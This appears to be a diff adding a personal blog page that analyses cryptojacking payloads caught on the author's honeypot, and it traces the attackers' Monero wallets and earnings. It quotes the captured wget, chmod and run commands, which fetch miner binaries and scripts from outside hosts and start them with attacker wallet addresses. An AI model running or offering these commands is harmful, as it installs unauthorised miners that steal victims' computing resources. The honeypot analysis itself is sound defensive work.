@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<!-- Written in vim :) -->
+<html>
+<head>
+<title>XMR-Rigs</title>
+<link rel="stylesheet" type="text/css" href="https://people.rit.edu/sjf5462/main.css"/>
+</head>
+<script src="//instant.page/5.1.0" type="module" integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
+<body>
+
+<h1><b> XMR-Rigs </b></h1>
+
+<figure>
+<img width=40% src="images/monero.svg.png"></img>
+</figure>
+
+<p>
+Monero (XMR) is a cryptocurrency that focuses on privacy and anonymity. Unlike bitcoin and many other cryptocurrencies "Observers cannot decipher addresses trading monero, transaction amounts, address balances, or transaction histories". There have been multiple XMR mining payloads dropped onto my honeypot.
+</p>
+
+<p>
+The first example downloads a payload from nasapaul.com with the address given as a command line argument.
+</p>
+
+<code>
+wget nasapaul.com/cnrig<br>
+chmod 777 cnrig<br>
+./cnrig --donate-level 1 -o pool.supportxmr.com:443 -u 45P2hmaiEzFcw2ZDGCAUko1Q13AAA8f6PMkvsqC3sSWzDxoSF5DRDFTVH5RJosNiggCri7k4CqyhZBbHoHaqExe62p62qxE -p rut -k --tls -B<br>
+</code>
+
+<p>
+Going to supportxmr.com, and using the attackers address ("45P2h...") we can see the attacker was able to mine around 4 XMR. At the time of writing that translates to around $1000. The attacker would have gotten less USD then that however, since the price of XMR has been rising. The attackers address does not have any active miners. The site nasapaul.com also seems to not be able to serve the payload anymore. Downloading slows to a snails pace around the 100k mark (Update, about one week later they fixed it). The site is written partially in English and partially in Romanian. Looking at the whois records for the domain does not reveal much, since everything is GDPR Masked. The site is also behind cloudflare, so we cannot find out the websites IP. The site also has links to what looks like IP ranges, username/password files, a script that gets information about the current host, and an IRC C2. They also had a discord link in a HTML comment, but the server looked inactive, and you needed premium to join any of the channels.
+</p>
+
+<p>
+The second downloads a payload straight from c3pool. C3pool is a mining pool, but also hosts scripts to make it easier to setup miners. The shell script downloads a binary named <a href="https://github.com/xmrig/xmrig">xmrig</a> (Matches on must .
+</p>
+
+<code>
+wget -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh<br>
+busybox wget http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh<br>
+chmod 777 *<br>
+./setup_c3pool_miner.sh 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
+</code>
+
+<figure>
+<img width=70% src="images/c3pool.png"></img>
+</figure>
+
+<p>
+The account associated with the given ("492cU...") was still active (112 miners) and had already received 1.6 XMR. Using the current hash rate, the site predicts that this account will make 1 XMR every month. The first payment that this account sent was on April 18, 2021.
+</p>
+
+<p>
+There was also many binaries downloaded that could have been XMR miners. I used the following command to detect that some of them were XMR miners.
+</p>
+
+<code>
+strings xmrig | awk '{if(length==95) print $0 }'
+</code>
+
+<p>
+Strings finds all sequences of printable characters in a file. I then use awk to find all strings that have a length of 95, which is how long Monero addresses are. The binary does have to be unpacked and the address has to be stored continuously for this to work.
+</p>
+
+<div><a href="https://en.wikipedia.org/wiki/Monero">Monero (Wikipedia)</a></div>
+<div><a href="https://supportxmr.com/">supportxmr</a></div>
+<div><a href="https://c3pool.com/oldui/en/">c3pool</a></div>
+<div><a href="../">../</a></div>
+</body>
+</html>
